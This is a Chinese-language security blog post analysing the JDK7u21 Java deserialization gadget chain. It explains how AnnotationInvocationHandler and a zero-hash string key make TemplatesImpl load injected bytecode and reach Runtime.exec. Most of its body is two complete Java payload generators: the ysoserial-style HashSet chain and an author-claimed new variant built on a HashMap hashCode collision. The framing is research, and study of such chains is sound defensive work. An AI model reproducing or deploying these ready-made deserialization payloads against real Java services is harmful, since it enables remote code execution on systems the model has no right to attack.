---
title: "JDK7u21 反序列化分析"
date: 2022-12-17T21:21:44+08:00
lastmod: 2022-12-17T21:21:44+08:00
draft: false
author: "X1r0z"

tags: ['jdk']
categories: ['Java安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

以及一种可能是新的构造方式?

<!--more-->

## JDK7u21 分析

先贴一遍 ysoserial 的 gadget chain

```
LinkedHashSet.readObject()
  LinkedHashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
                          ...
                            MaliciousClass.<clinit>()
                              ...
                                Runtime.exec()
```

这条链的核心是 AnnotationInvocationHandler, 它的 equalsImpl 方法能够遍历并执行某个类的所有 (无参) 方法 (有参则会抛出异常)

![image-20221217214313080](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212172143223.png)

`this.type` 和 `this.memberValues` 通过构造方法来确定

然后上面遍历得到的所有 Method 都来自 `this.type` 这个 Class 对象, 后面写 payload 的时候需要注意一下

而 AnnotationInvocationHandler 本身也是个代理类, 其 invoke 方法如下

![image-20221217214404216](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212172144276.png)

那么只要能调用到被代理对象的 equals 方法, 就能够触发 equalsImpl 调用无参方法

这个调用 "无参方法" 的操作很容易就可以想到去找 TemplatesImpl 类的 newTransformer() 或 getOutputProperties()

而至于如何调用 equals, ysoserial 给出的思路是利用 HashSet 这种数据结构的唯一性

因为 HashSet 必须要保证 key 唯一, 那么势必会涉及到两个 key 的比较, 有比较就会存在 equals

来看 HashSet 的 readObject 方法

![image-20221217215520230](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212172155276.png)

其内部维护了一个 HashMap, 它的 put 方法如下

![image-20221217215608522](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212172156566.png)

这里需要使两个 key 的 hash 相等, 才能够进入到 `key.equals(k)` 这一步

作者的思路是利用 AnnotationInvocationHandler 计算 hashCode 的缺陷来构造一个和 TemplatesImpl 一样的 hash

```java
private int hashCodeImpl() {
    int var1 = 0;

    Map.Entry var3;
    for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
        var3 = (Map.Entry)var2.next();
    }

    return var1;
}
```

代码风格看着有点抽象...

核心思路很简单: 让 memberValues 简化成只有一个键值对的形式, 令 key 的 HashCode 为 0, 这样计算出来的 HashCode 就和 value 的一模一样了

然这时后我们把 TemplatesImpl 赋给 value, 最终就会产生 AnnotationInvocationHandler 和 TemplatesImpl 两者 hash 一致的效果

那么只需要找出一个 HashCode 为 0 的字符串即可, 我用的是 `f5a5a608` (其实是自己懒得跑了, 网上也没找到其它的...)

最终 payload 如下

```java
package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class JDK7u21Test1 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(Evil.class.getName());
        byte[] code = ctClass.toBytecode();

        Reflection.setFieldValue(templatesImpl, "_name", "Hello");
        Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{code});

        Map innerMap = new HashMap();
        innerMap.put("f5a5a608", 123); // value 先随便设置一个值, 防止在 put 的时候触发 payload

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Templates.class, innerMap); // 传入 Templates.class, 因为这个接口就只有两个方法, 而且这两个方法都能够触发 payload, 更容易操作
        Templates proxy = (Templates) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Templates.class}, handler);

        HashSet set = new HashSet();
        set.add(templatesImpl);
        set.add(proxy);

        innerMap.put("f5a5a608", templatesImpl); // 放入最终的 TemplatesImpl 对象, 这里 put 会覆盖掉原来的 value

        Serialization.test(set);
    }
}
```

![image-20221217221854260](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212172218430.png)

## 新的构造方式

自己搞出来的一种新的构造方式 (?)

其实原理差不多, 都是利用 AnnotationInvocationHandler 来触发 TemplatesImpl, 不过这里的入口点换成了 HashCode 碰撞的形式, 类似于 cc7

调试流程我就不写了

```java
package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class JDK7u21Test2 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(Evil.class.getName());
        byte[] code = ctClass.toBytecode();

        Reflection.setFieldValue(templatesImpl, "_name", "Hello");
        Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Templates.class, new HashMap());
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

        Map map1 = new HashMap();
        Map map2 = new HashMap();
        map1.put("yy",proxyMap);
        map1.put("zZ",templatesImpl);
        map2.put("yy",templatesImpl);
        map2.put("zZ",proxyMap);

        Map map = new HashMap();
        map.put(map1, 1);
        map.put(map2, 2);

        Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{code});

        Serialization.test(map);

    }
}
```

![image-20221217222228152](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212172222259.png)